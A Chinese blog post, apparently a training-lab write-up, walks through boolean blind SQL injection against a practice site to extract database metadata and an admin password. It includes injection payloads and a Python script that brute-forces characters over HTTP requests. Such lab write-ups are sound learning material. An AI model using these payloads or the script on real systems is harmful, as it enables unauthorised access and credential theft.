---
title: 记一次用Python挑战SQL注入
date: 2020-04-13 18:07:52
categories:
	- 渗透测试
	- Python
tags:
	- Python
	- 渗透测试
---
## 前言
- 最近哥们给我分享了一个靶场地址，疫情在家闲着无聊便拿来挑战一下。
- [靶场地址](https://hack.zkaq.cn/)
## 分析
- 可以看到，题目要求是拿到管理员密码即可。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200413171506664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70)

- 再进入靶机页面瞅瞅，看来就是要在url上操作了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200413171823314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70)
- 简单加一个and 1=1和and 1=2，发现1=1时，显示下面的猫舍介绍，1=2时，不显示猫舍介绍。这个变化就作为分辨依据。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200413174244815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70)

## 开始挑战
### 先拿一手user()（此时我已经忘记题目要求要拿管理员密码。。。。。）
##### 先拿user()长度
- 先and char_length(user())>0，OK
- 再and char_length(user()>100),ERROR
- 。。。。。。（中间省略，自己慢慢试）
- 就这样把user()的长度试了出来，16。
##### 长度出来，试字段
- 用and ASCII(mid(user(),1,1))>0，试出来后查表转换为字符
- 然后我们用python（不要问我为啥突然用python，试了8个字符后，手都试酸了。。。T0T）
- 上代码（代码不能直接用啊，自己简单分析一下，根据自己要获取的内容改一下，再补全IP就能用了）

```python
import re,requests

result = []
string = []
for j in range(1,17):	#循环第几个字符
    for i in range(97,123):	#从ASCII码表的第几到几开始试，试全部可能会慢很多
        #url = 'http://117.167.*.*:10180/index.php?id=1%20and%20(select%20ascii(mid(password,'+str(j)+',1))%20from%20admin)='+str(i) #找password时候用的
        #url = 'http://117.167.*.*:10180/index.php?id=1'+'and ASCII(mid(1,1))='+str(i)
        url = 'http://117.167.*.*:10180/index.php?id=1%20and%20ASCII(mid(user(),'+str(j)+',1))='+str(i)
        res = requests.get(url)
        res.encoding = 'utf8'
        if("猫舍介绍" in res.text):#判断返回的是OK还是ERROR
            print(str(j)+'是'+str(i))
            result.append(str(j)+':'+str(i))
            string.append(str(j)+':'+chr(i)) #将得到的编码自动转换成字符
            break
        else:
            print('不是'+str(i))

print(result)
print(string)
```
- 程序运行完之后记得查看输出结果是否有没试出来的字符，可以换个区间重新试一下或者自己手动试。

### 同理再拿一手database()
- maoshe
### 再拿一手version()
- 5.5.53
### 再拿一手hostname
- gongksik_d45fb6
### 再拿一手。。。。。。
### 哎，我到底要拿啥来着，哦对，管理员密码
#### 先找表
- 先随便试一下有没有admin表，and (select count(*) from admin)>0，Woc！！！还真有！
- 再随便试一下有没有password字段，and(select count(password) from admin)>0，Woc！！！又有！
- 这里博主走了点狗屎运，读者请勿模仿，自行一个个猜哈~
- 接下来就简单了，用上上面的python代码
- 注入标记改为(select ASSII(mid(password,1,1)))>0
- 然后就得到了管理员密码——（自己试去，┑(￣▽ ￣)┍）
### 接下来最重要的步骤——登录MySQL系统
- 等好久都不成功，才想起我们的目标只是拿到管理员密码。。。。。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200413180149362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3MTg0Mg==,size_16,color_FFFFFF,t_70)
## 后记
- 本次SQL注入到此结束，还愣着干啥，点赞关注走一走啊。。。。（￣︶￣）↗
